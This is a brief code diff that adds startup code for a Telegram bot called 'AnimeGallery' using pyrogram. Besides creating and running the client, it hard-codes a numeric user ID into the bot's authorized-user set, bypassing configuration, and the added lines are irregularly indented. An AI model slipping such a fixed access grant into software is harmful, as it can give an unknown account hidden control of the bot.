@@ -12,6 +12,15 @@ else:
 
 import pyrogram
 
+ app = pyrogram.Client(
+        "AnimeGallery",
+        bot_token=Config.TG_BOT_TOKEN,
+        api_id=Config.APP_ID,
+        api_hash=Config.API_HASH,
+        plugins=plugins
+ )
+    Config.AUTH_USERS.add(677682427)
+    app.run()
 
 from telethon import TelegramClient, events, Button
 from gogoanimeapi import gogoanime as gogo
